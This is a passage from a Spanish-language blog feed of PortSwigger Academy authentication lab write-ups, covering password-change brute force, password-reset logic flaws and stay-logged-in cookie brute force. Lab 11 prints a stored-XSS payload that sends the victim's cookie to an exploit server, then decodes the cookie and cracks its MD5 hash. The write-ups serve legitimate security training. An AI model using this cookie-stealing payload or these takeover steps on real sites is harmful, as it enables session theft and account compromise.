&lt;p&gt;Ahora si probamos la funcionalidad, enviamos la peticion para cambiarla y notamos que se envia el usuario al que se quiere cambiar la contrasena&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 245; 
			flex-basis: 589px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/request.png&#34; data-size=&#34;1230x501&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/request.png&#34;
			width=&#34;1230&#34;
			height=&#34;501&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/request_hu2374fc38260bf8f621c1a9974e19f9ca_72955_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/request_hu2374fc38260bf8f621c1a9974e19f9ca_72955_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request enviada para cambiar la contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request enviada para cambiar la contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Asi que teniendo esto lo que haremos es enviar la la &lt;code&gt;current-password&lt;/code&gt; realizando fuerza bruta al usuario carlos para cambiar la contrasena, pero hay un detalle que al enviar esto, las respuestas no nos arrojan si se cambio la contrasena, por esta razon lo que hice fue &lt;code&gt;colocar contrasenas diferentes en new password&lt;/code&gt; lo que hara que se nos muestre un error de match y la respuesta sea diferente al resto.png&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Colocar contrasenas diferentes en new password para no hacer match y generar error&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 281; 
			flex-basis: 674px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/results.png&#34; data-size=&#34;897x319&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/results.png&#34;
			width=&#34;897&#34;
			height=&#34;319&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/results_huf097d1a5537fa5f7acc7a20173bb304a_16001_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/results_huf097d1a5537fa5f7acc7a20173bb304a_16001_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas de intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas de intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora nos muestra que la contrasena es &lt;code&gt;77777&lt;/code&gt; porque la contrasenas no hacen match porque si valida que la contrasena sea la correcta. Y ya podriamos ingresar con el usuario &lt;code&gt;carlos:777777&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 129; 
			flex-basis: 310px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/resuelto.png&#34; data-size=&#34;1739x1345&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/resuelto.png&#34;
			width=&#34;1739&#34;
			height=&#34;1345&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/resuelto_hu85855c1315a3933605f0cec2c1cb77c6_128132_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-14/resuelto_hu85855c1315a3933605f0cec2c1cb77c6_128132_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 11</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/</link>
        <pubDate>Thu, 25 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 11" /&gt;&lt;h1 id=&#34;lab-offline-password-cracking&#34;&gt;Lab: Offline password cracking&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es ingresar con el usuario &lt;code&gt;carlos&lt;/code&gt; el cual hay que robar la cookie y luego crackear la contrasena en offline para poder entrar al sistema con el usuario carlos para que al resolver el lab se debe de eliminar el usuario carlos y estara resuelto.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero que tenemos es que podemos ingresar con el usuario &lt;code&gt;wiener&lt;/code&gt;, lo primero que notamos es que podemos escribir comentarios en el sistema, y ahi es donde tenemos una idea de que se puede ingresar codigo javascript para aprovecharse por medio de javascript robar una cookie si no se cuenta con el header de &lt;code&gt;httpOnly&lt;/code&gt;. La forma de ataque es el siguiente:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 167; 
			flex-basis: 401px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/ataque.png&#34; data-size=&#34;689x412&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/ataque.png&#34;
			width=&#34;689&#34;
			height=&#34;412&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/ataque_hu96cf820d15d58f685632afe05c652e37_23802_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/ataque_hu96cf820d15d58f685632afe05c652e37_23802_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque diagramado&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque diagramado&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso, aprovechando que ya hemos iniciado sesion, colocamos el siguiente comentario, ya que el sistema nos da un exploit server en el cual podemos ver los logs. Lo que comentamso seria el siguiente codigo, que lo que hara es inyectar el codigo javascript que a su vez lo que hara es redirigir a la siguiente web con el valor de la cookie en la url para posteriormente nosotros tomarla.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://exploit-aca31fc11ef256eac0eb50c801be00df.web-security-academy.net/exploit?c=&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 114; 
			flex-basis: 275px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/comentario.png&#34; data-size=&#34;1125x979&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/comentario.png&#34;
			width=&#34;1125&#34;
			height=&#34;979&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/comentario_huec7a7c46c9e39ea76b182080e9a0a1ea_72022_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/comentario_huec7a7c46c9e39ea76b182080e9a0a1ea_72022_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Comentario xss&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Comentario xss&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego de que hemos inyectado el codigo debemos quedarnos a la espera de la solicitud de la victima, y en el log estara, en este caso esta &lt;code&gt;/exploit?c=secret=...&lt;/code&gt; que es el valor de la cookie.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 239; 
			flex-basis: 575px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/log.png&#34; data-size=&#34;2083x869&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/log.png&#34;
			width=&#34;2083&#34;
			height=&#34;869&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/log_hu93581bcaf58020bba5d43481ac62764d_463110_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/log_hu93581bcaf58020bba5d43481ac62764d_463110_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Log del servidor web atacante&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Log del servidor web atacante&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al notar la cookie que tenemos vamos a decodificar la cookie desde bash:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d
carlos:26323c16d5f4dabff3bb136f2460a943
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora lo que haremos es descifrar el valor de &lt;code&gt;26323c16d5f4dabff3bb136f2460a943&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 544; 
			flex-basis: 1306px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/md5.png&#34; data-size=&#34;1650x303&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/md5.png&#34;
			width=&#34;1650&#34;
			height=&#34;303&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/md5_huf81a0857fbde378c9bf7be1b5046e1b7_97869_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/md5_huf81a0857fbde378c9bf7be1b5046e1b7_97869_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Descifrar contrasena MD5&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Descifrar contrasena MD5&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Finalmente, ya que tenemos la contrasena entramos con las credenciales de carlos y eliminamos la cuenta para resolver el lab&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 285; 
			flex-basis: 685px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/resuelto.png&#34; data-size=&#34;1787x626&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/resuelto.png&#34;
			width=&#34;1787&#34;
			height=&#34;626&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/resuelto_hue7f615e819fee2bdf43606558a64509a_78441_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-11/resuelto_hue7f615e819fee2bdf43606558a64509a_78441_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 12</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/</link>
        <pubDate>Thu, 25 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 12" /&gt;&lt;h1 id=&#34;lab-password-reset-broken-logic&#34;&gt;Lab: Password reset broken logic&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es aprovecharse de una vulnerabilidad en la recuperacion de contrasena, la cual permite que un usuario pueda hacerse con otra cuenta por la mala implementacion de esta funcion.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;La pagina consta de un inicio de sesion el cual, tiene una parte de recuperacion de contrasena, y si colocamos el usuario de &lt;code&gt;wiener&lt;/code&gt; recibimos un correo con el link para recuperar la contrasena. Si&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 262; 
			flex-basis: 630px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/email.png&#34; data-size=&#34;1777x676&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/email.png&#34;
			width=&#34;1777&#34;
			height=&#34;676&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/email_hu4d30352ac233d75ac7244d145dd14ceb_127530_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/email_hu4d30352ac233d75ac7244d145dd14ceb_127530_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Correo de recuperacion de contrasena&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Correo de recuperacion de contrasena&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Si abrimos el link nos enviara a ingresar la nueva contrasena del usuario&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 261; 
			flex-basis: 627px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/form.png&#34; data-size=&#34;1137x435&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/form.png&#34;
			width=&#34;1137&#34;
			height=&#34;435&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/form_hu0b640d4014b928efcad0567e59cc108a_20018_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/form_hu0b640d4014b928efcad0567e59cc108a_20018_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Nueva contrasena para usuario&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Nueva contrasena para usuario&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso todo normal, pero es cuando empezamos a proxear y ver las peticiones que se envian al servidor con burp, y como es el caso al ingresar los datos y enviar la peticion va el valor del usuario al que se le va a cambiar la contrasena que es wiener&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Es enviada en la peticion el nombre de usuario al que se le cambia la contrasena&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 503px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/peticion.png&#34; data-size=&#34;1015x484&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/peticion.png&#34;
			width=&#34;1015&#34;
			height=&#34;484&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/peticion_hu71e9a1058e653e2abda48446a3f1cc8b_75083_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/peticion_hu71e9a1058e653e2abda48446a3f1cc8b_75083_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion enviada al servidor con nombre de usuario&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion enviada al servidor con nombre de usuario&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Aca aprovechamos y podemos hacer el cambio por el usuario &lt;code&gt;wiener a carlos&lt;/code&gt;, lo cual aprovechando del link anterior pero que la cookie o el codigo no esta asignado al propio usuario nos permite cambiarle la contrasena al usuario carlos, para posteriormente ingresar con ese usuario.&lt;/p&gt;
&lt;p&gt;Al finalizar esta solicitud ya podriamos ingresar con el usuario carlos y la nueva contrasena que hemos colocado y resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 196; 
			flex-basis: 472px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/resuelto.png&#34; data-size=&#34;1792x910&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/resuelto.png&#34;
			width=&#34;1792&#34;
			height=&#34;910&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/resuelto_huce16c3590cdad1c67d77f0138a7dee8b_101843_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-12/resuelto_huce16c3590cdad1c67d77f0138a7dee8b_101843_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 10</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/</link>
        <pubDate>Wed, 24 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 10" /&gt;&lt;h1 id=&#34;lab-brute-forcing-a-stay-logged-in-cookie&#34;&gt;Lab: Brute-forcing a stay-logged-in cookie&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es ingresar con el usuario &lt;code&gt;carlos&lt;/code&gt; el cual contiene una vulnerabilidad en el inicio de sesion&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Para resolver el ejercicio se nos da el listado de contrasenas con el que nos podemos autenticar con el usuario carlos para realizar las pruebas, pero al iniciar sesion notamos que tiene una opcion de mantener el inicio de sesion, el cual contiene una vulnerabilidad ya que pareciera que es una cookie random pero no.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Al iniciar sesion con la opcion habilitada, se crea una cookie distinta que no parece random, en este caso cuando intentamos descifrar la cookie nos damos cuenta que esta codificada el usuario y su contrasena.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 184; 
			flex-basis: 443px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/cyberchef.png&#34; data-size=&#34;1524x824&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/cyberchef.png&#34;
			width=&#34;1524&#34;
			height=&#34;824&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/cyberchef_huae1cd2014d43f953956d671c997ac2bf_187188_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/cyberchef_huae1cd2014d43f953956d671c997ac2bf_187188_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al querer descifrar la contrasena, nos encontramos con que esta en formato MD5, por lo cual hemos encontrado el proceso para codificar la cookie&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 495; 
			flex-basis: 1190px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/md5.png&#34; data-size=&#34;1557x314&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/md5.png&#34;
			width=&#34;1557&#34;
			height=&#34;314&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/md5_hu4734063bd35271135622d7660cb7b49b_95688_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/md5_hu4734063bd35271135622d7660cb7b49b_95688_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Password en formato MD5&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Password en formato MD5&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora debemos crear una cookie nueva inyectado las contrasenas y el usuario carlos. Todo esto a traves del intruder de burpsuite.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 253; 
			flex-basis: 608px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payloadposition.png&#34; data-size=&#34;1256x495&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payloadposition.png&#34;
			width=&#34;1256&#34;
			height=&#34;495&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payloadposition_hu342e6764efec963f9f7e1bdae65ee129_67184_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payloadposition_hu342e6764efec963f9f7e1bdae65ee129_67184_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Posiciones en el payload&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Posiciones en el payload&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 241; 
			flex-basis: 580px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payload1.png&#34; data-size=&#34;1253x518&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payload1.png&#34;
			width=&#34;1253&#34;
			height=&#34;518&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payload1_hu5b601d2897d9422b72ce716be0d88e3d_28056_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/payload1_hu5b601d2897d9422b72ce716be0d88e3d_28056_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 319; 
			flex-basis: 766px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/resuelto.png&#34; data-size=&#34;1780x557&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;557&#34;
